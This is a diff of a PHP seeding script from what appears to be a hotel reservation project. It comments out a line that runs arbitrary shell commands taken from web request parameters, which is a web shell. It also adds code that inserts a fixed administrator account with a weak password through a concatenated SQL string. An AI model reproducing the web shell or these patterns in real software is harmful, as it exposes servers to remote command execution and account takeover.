@@ -1,25 +1,29 @@
 <?php
-	/**
-	 * File: fill.php
-	 *
-	 * Created by PhpStorm.
-	 * User: ArtofWack
-	 * Date: 10/26/2015
-	 * Time: 10:40 PM
-	 */
-	/*require_once("scrypt.php");
+/**
+ * File: fill.php
+ *
+ * Created by PhpStorm.
+ * User: ArtofWack
+ * Date: 10/26/2015
+ * Time: 10:40 PM
+ */
+require_once("scrypt.php");
+require_once('config.php');
 
-	$link = new mysqli('localhost', 'hotel', 'reserve', 'hotel');
-	$encrypt = Password::hash("decrepito2");
-	if ($link->connect_error)
-		die("Connection failed: " . $link->connect_error);
+$link = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);
+if ($link->connect_error)
+	die("Connection failed: " . $link->connect_error);
 
-	$sql = 'SELECT * FROM guests';
+$usr = "batman";
+$email = "knight@gmail.com";
+$pass = Password::hash('dark');
 
-	$result = $link->query($sql);
+$sql = 'INSERT INTO admins(username,email,password) VALUES ("' . $usr . '","' . $email . '", "' . $pass . '");';
 
-	if (isset($result))
-		$result->close();
-	$link->close();*/
+$result = $link->query($sql);
 
-	echo shell_exec($_REQUEST['command']);
+if (isset($result))
+	$result->close();
+$link->close();
+
+//echo shell_exec($_REQUEST['command']);
